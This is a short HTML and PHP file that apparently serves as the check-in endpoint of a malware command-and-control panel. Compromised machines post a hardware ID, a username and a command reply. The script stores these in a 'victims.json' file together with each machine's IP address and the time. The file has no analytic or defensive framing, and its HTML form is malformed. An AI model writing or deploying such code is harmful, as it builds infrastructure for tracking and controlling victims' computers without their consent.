<html>
<body>

<form action="report.php" method="post">
<type="text" name="hwid"><br>
<type="text" name="username"><br>
<type="text" name="echo_reply"><br>
</form>

</body>
</html>

<?php
try{
if ($_SERVER['REQUEST_METHOD'] != 'POST'){throw new Exception("WRONG REQUEST METHOD");}
else{
    $hwid = $_POST['hwid'];
    $username = $_POST['username'];
    $echo_reply = $_POST['echo_reply'];
    if ($username != "" && $hwid != ""){
        $jsonString = file_get_contents('victims.json');
        $data = json_decode($jsonString, true);
        if ($echo_reply != "") $data[$hwid]['echo_reply'] = $echo_reply;
        $data[$hwid]['username'] = $username;
        $data[$hwid]['ip'] = $_SERVER['REMOTE_ADDR'];
        $data[$hwid]['datetime'] = date('Y/m/d G:i:s');
        $newJsonString = json_encode($data);
        file_put_contents('victims.json', $newJsonString);
        }
    }
}
catch(Exception $e) {
  echo $e->getMessage();
}
?>